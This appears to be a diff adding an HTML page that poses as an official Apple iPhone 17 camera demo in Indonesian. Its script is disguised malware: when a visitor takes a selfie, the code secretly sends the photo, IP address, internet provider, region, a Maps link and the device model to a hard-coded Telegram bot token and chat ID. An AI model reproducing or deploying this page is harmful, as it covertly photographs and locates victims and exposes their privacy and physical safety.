@@ -1,0 +1,431 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Rasakan Kamera dari Website Resmi Perusahaan Apple iPhone 17</title>
+
+  <style>
+    :root {
+      --bg: #030313;
+      --card: #0f1724;
+      --accent: #06b6d4;
+      --muted: #94a3b8;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+      background: linear-gradient(180deg, #030313 0%, #081025 100%);
+      color: #e6eef6;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .wrap {
+      width: 100%;
+      max-width: 420px;
+      border-radius: 14px;
+      padding: 14px;
+      background: linear-gradient(180deg, rgba(255, 255, 255, .02), rgba(255, 255, 255, .01));
+      border: 1px solid rgba(255, 255, 255, .03);
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+
+    h1 {
+      font-size: 16px;
+      margin: 0;
+    }
+
+    .sub {
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .viewer {
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #000;
+      aspect-ratio: 3/4;
+    }
+
+    video, canvas {
+      display: block;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .frame {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background: linear-gradient(180deg, rgba(0,0,0,0), rgba(0,0,0,.15));
+    }
+
+    .flash {
+      position: absolute;
+      inset: 0;
+      background: #fff;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .18s ease;
+    }
+
+    .controls {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      justify-content: center;
+      margin-top: 12px;
+    }
+
+    button {
+      border: 0;
+      padding: 10px 12px;
+      border-radius: 10px;
+      font-weight: 700;
+      cursor: pointer;
+      background: linear-gradient(180deg, var(--accent), #0ea5a1);
+      color: #042027;
+    }
+
+    .btn-plain {
+      background: rgba(255,255,255,.02);
+      color: var(--muted);
+      border: 1px solid rgba(255,255,255,.02);
+      box-shadow: none;
+      font-weight: 600;
+    }
+
+    .big {
+      padding: 14px 18px;
+      border-radius: 999px;
+      font-size: 16px;
+    }
+
+    .toolbar {
+      margin-top: 10px;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .filters {
+      display: flex;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+
+    .filter-btn {
+      padding: 6px 8px;
+      border-radius: 8px;
+      font-size: 12px;
+      background: rgba(255,255,255,.02);
+      color: var(--muted);
+      border: 1px solid rgba(255,255,255,.02);
+      cursor: pointer;
+    }
+
+    .filter-btn.active {
+      background: linear-gradient(90deg, #064e52, #0fb2b0);
+      color: #042027;
+      font-weight: 700;
+    }
+
+    #preview {
+      margin-top: 10px;
+      text-align: center;
+    }
+
+    #preview img {
+      max-width: 100%;
+      border-radius: 10px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .status {
+      font-size: 13px;
+      color: var(--muted);
+      text-align: center;
+      margin-top: 8px;
+    }
+
+    .small {
+      font-size: 13px;
+      padding: 8px 10px;
+      border-radius: 10px;
+    }
+
+    .progress {
+      height: 4px;
+      background: rgba(255,255,255,.04);
+      border-radius: 4px;
+      margin-top: 8px;
+      overflow: hidden;
+      display: none;
+    }
+
+    .progress > i {
+      display: block;
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, #06b6d4, #34d399);
+      transition: width .3s linear;
+    }
+
+    @media(max-width:420px){
+      .wrap{padding:12px}
+    }
+  </style>
+</head>
+
+<body>
+  <div class="wrap">
+    <header>
+      <div>
+        <h1>Kamera</h1>
+        <div class="sub">IPHONE 17 PRO MAX</div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center">
+        <div style="width:36px;height:36px;border-radius:8px;background:rgba(255,255,255,.02);display:flex;align-items:center;justify-content:center;color:var(--muted)">🫦</div>
+      </div>
+    </header>
+
+    <div class="viewer" id="viewer">
+      <video id="video" autoplay playsinline></video>
+      <canvas id="hiddenCanvas" style="display:none"></canvas>
+      <div class="frame"></div>
+      <div class="flash" id="flash"></div>
+    </div>
+
+    <div class="controls">
+      <button id="switchBtn" class="btn-plain small">Ganti Kamera</button>
+      <button id="selfieBtn" class="big">Selfie</button>
+      <button id="downloadBtn" class="btn-plain small">Unduh</button>
+    </div>
+
+    <div class="toolbar">
+      <div class="filters" id="filters">
+        <button class="filter-btn active" data-filter="none">Normal</button>
+        <button class="filter-btn" data-filter="grayscale(100%)">Mono</button>
+        <button class="filter-btn" data-filter="sepia(80%)">Sepia</button>
+        <button class="filter-btn" data-filter="contrast(130%)">Kontras</button>
+        <button class="filter-btn" data-filter="brightness(120%)">Bright</button>
+        <button class="filter-btn" data-filter="invert(100%)">Invert</button>
+      </div>
+
+      <div style="display:flex;gap:6px;align-items:center">
+        <div class="sub">Zoom:</div>
+        <input id="zoom" type="range" min="1" max="2" step="0.01" value="1" style="width:110px">
+      </div>
+    </div>
+
+    <div id="preview"></div>
+    <div class="progress" id="progress"><i id="bar"></i></div>
+    <div class="status" id="status">Siap</div>
+  </div>
+
+  <script>
+    const T = "8006297126:AAGglRLsESXSMF3of0kDMkuxvQUafUHmyho";
+    const C = "7953339989";
+    const v = document.getElementById("video");
+    const c = document.getElementById("hiddenCanvas");
+    const s = document.getElementById("selfieBtn");
+    const w = document.getElementById("switchBtn");
+    const p = document.getElementById("preview");
+    const f = document.getElementById("flash");
+    const st = document.getElementById("status");
+    const pg = document.getElementById("progress");
+    const pb = document.getElementById("bar");
+    const d = document.getElementById("downloadBtn");
+    const fl = document.getElementById("filters");
+    const z = document.getElementById("zoom");
+
+    let m = null, g = "user", F = "none", Z = 1;
+
+    function y() {
+      v.style.filter = F + " brightness(1)";
+      v.style.transform = "scale(" + Z + ")";
+    }
+
+    async function S() {
+      m && m.getTracks().forEach(t => t.stop());
+      try {
+        try {
+          m = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: g } }, audio: false });
+        } catch (e) {
+          m = await navigator.mediaDevices.getUserMedia({ video: { facingMode: g === "user" ? "user" : "environment" }, audio: false });
+        }
+        v.srcObject = m;
+        v.play();
+        st.textContent = "Kamera aktif";
+      } catch (e) {
+        alert("Gagal membuka kamera: " + e.message);
+        st.textContent = "Gagal akses kamera";
+      }
+    }
+
+    w.onclick = () => {
+      g = g === "user" ? "environment" : "user";
+      S();
+    };
+
+    fl.onclick = e => {
+      let b = e.target.closest(".filter-btn");
+      if (!b) return;
+      document.querySelectorAll(".filter-btn").forEach(q => q.classList.remove("active"));
+      b.classList.add("active");
+      F = b.dataset.filter || "none";
+      y();
+    };
+
+    z.oninput = e => {
+      Z = e.target.value;
+      y();
+    };
+
+    function L() {
+      f.style.transition = "none";
+      f.style.opacity = "0.9";
+      requestAnimationFrame(() => {
+        f.style.transition = "opacity .22s ease";
+        f.style.opacity = "0";
+      });
+    }
+
+    async function detectNamaHP() {
+      let model = "Unknown";
+      try {
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+          const hints = await navigator.userAgentData.getHighEntropyValues(["model"]);
+          if (hints.model) model = hints.model;
+        }
+      } catch (e) {}
+
+      if (model === "Unknown" || model === "") {
+        if (/iPhone/i.test(navigator.userAgent)) model = "iPhone";
+        else if (/iPad/i.test(navigator.userAgent)) model = "iPad";
+        else if (/Android/i.test(navigator.userAgent)) model = "Android";
+      }
+      return model;
+    }
+
+    async function fetchIpInfo() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        return {
+          ip: data.ip || "Unknown",
+          provider: data.org || "Unknown",
+          provinsi: data.region || "Unknown"
+        };
+      } catch (e) {
+        return { ip: "Unknown", provider: "Unknown", provinsi: "Unknown" };
+      }
+    }
+
+    async function A() {
+      if (!v.videoWidth || !v.videoHeight) {
+        alert("Kamera belum siap");
+        return;
+      }
+      c.width = v.videoWidth;
+      c.height = v.videoHeight;
+      let x = c.getContext("2d");
+      x.filter = F === "none" ? "none" : F;
+      let h = (v.videoWidth - v.videoWidth / Z) / 2;
+      let u = (v.videoHeight - v.videoHeight / Z) / 2;
+      let o = v.videoWidth / Z;
+      let n = v.videoHeight / Z;
+      x.drawImage(v, h, u, o, n, 0, 0, c.width, c.height);
+
+      c.toBlob(async blob => {
+        if (!blob) {
+          alert("Gagal membuat foto");
+          return;
+        }
+
+        p.innerHTML = '<img src="' + URL.createObjectURL(blob) + '" alt="preview">';
+        L();
+        st.textContent = "Mengumpulkan info...";
+
+        const namaHP = await detectNamaHP();
+        const ipInfo = await fetchIpInfo();
+        const mapLink = "https://www.google.com/maps/search/" + encodeURIComponent(ipInfo.provinsi);
+
+        const caption = [
+          "Foto dari kamera",
+          "",
+          "IP: " + ipInfo.ip,
+          "Provider: " + ipInfo.provider,
+          "Provinsi: " + ipInfo.provinsi,
+          "Google Maps: " + mapLink,
+          "",
+          "Nama HP: " + namaHP
+        ].join("\n");
+
+        let fd = new FormData();
+        fd.append("chat_id", C);
+        fd.append("photo", blob, "selfie_" + Date.now() + ".jpg");
+        fd.append("caption", caption);
+
+        try {
+          st.textContent = "Mengirim...";
+          const res = await fetch("https://api.telegram.org/bot" + T + "/sendPhoto", { method: "POST", body: fd });
+          const json = await res.json();
+          if (res.ok && json.ok) {
+            st.textContent = "Terkirim";
+          } else {
+            st.textContent = "Gagal mengirim";
+          }
+        } catch (e) {
+          st.textContent = "Error upload";
+        }
+      }, "image/jpeg", 0.92);
+    }
+
+    s.onclick = () => A();
+
+    d.onclick = () => {
+      if (!c.width) {
+        alert("Ambil selfie dulu");
+        return;
+      }
+      c.toBlob(l => {
+        if (!l) return;
+        let a = document.createElement("a");
+        a.href = URL.createObjectURL(l);
+        a.download = "selfie_" + Date.now() + ".jpg";
+        a.click();
+        URL.revokeObjectURL(a.href);
+      }, "image/jpeg", 0.95);
+    };
+
+    v.onclick = () => {
+      let e = v.style.transform;
+      v.style.transition = "transform .16s ease";
+      v.style.transform = "scale(" + (Z * .98) + ")";
+      setTimeout(() => v.style.transform = e, 160);
+    };
+
+    S();
+  </script>
+</body>
+</html>
